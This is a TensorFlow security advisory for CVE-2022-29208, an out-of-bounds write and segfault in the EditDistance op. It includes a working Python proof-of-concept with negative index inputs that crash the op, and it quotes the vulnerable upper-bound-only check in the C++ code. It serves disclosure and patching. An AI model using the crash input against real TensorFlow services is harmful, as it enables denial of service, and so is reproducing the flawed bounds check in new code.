<h2>TFSA-2022-077: Segfault and OOB write due to incomplete validation in <code>EditDistance</code></h2>
<h3>CVE Number</h3>
<p>CVE-2022-29208</p>
<h3>Impact</h3>
<p>The implementation of <a href=""><code>tf.raw_ops.EditDistance</code></a> has incomplete validation. Users can pass negative values to cause a segmentation fault based denial of service:</p>
<p>```python
import tensorflow as tf</p>
<p>hypothesis_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64)
hypothesis_values = tf.constant(0, shape=[3], dtype=tf.int64)
hypothesis_shape = tf.constant(0, shape=[3], dtype=tf.int64)</p>
<p>truth_indices = tf.constant(-1250999896764, shape=[3, 3], dtype=tf.int64)
truth_values = tf.constant(2, shape=[3], dtype=tf.int64)
truth_shape = tf.constant(2, shape=[3], dtype=tf.int64)</p>
<p>tf.raw_ops.EditDistance(
  hypothesis_indices=hypothesis_indices,
  hypothesis_values=hypothesis_values,
  hypothesis_shape=hypothesis_shape,
  truth_indices=truth_indices,
  truth_values=truth_values,
  truth_shape=truth_shape)
```</p>
<p>In multiple places throughout the code, we are computing an index for a write operation:</p>
<p><code>cc
if (g_truth == g_hypothesis) {
  auto loc = std::inner_product(g_truth.begin(), g_truth.end(),
                                output_strides.begin(), int64_t{0});
  OP_REQUIRES(
      ctx, loc &lt; output_elements,
      errors::Internal("Got an inner product ", loc,
                       " which would require in writing to outside of "
                       "the buffer for the output tensor (max elements ",
                       output_elements, ")"));
  output_t(loc) =
      gtl::LevenshteinDistance&lt;T&gt;(truth_seq, hypothesis_seq, cmp);
  // ...
}</code></p>
<p>However, the existing validation only checks against the upper bound of the array. Hence, it is possible to write before the array by massaging the input to generate negative values for <code>loc</code>.</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/30721cf564cb029d34535446d6a5a6357bebc8e7">30721cf564cb029d34535446d6a5a6357bebc8e7</a>.</p>
<p>The fix will be included in TensorFlow 2.9.0. We will also cherrypick this commit on TensorFlow 2.8.1, TensorFlow 2.7.2, and TensorFlow 2.6.4, as these are also affected and still in supported range.</p>
<h3>For more information</h3>
<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
<h3>Attribution</h3>
<p>This vulnerability has been reported by Neophytos Christou from Secure Systems Lab at Brown University.</p>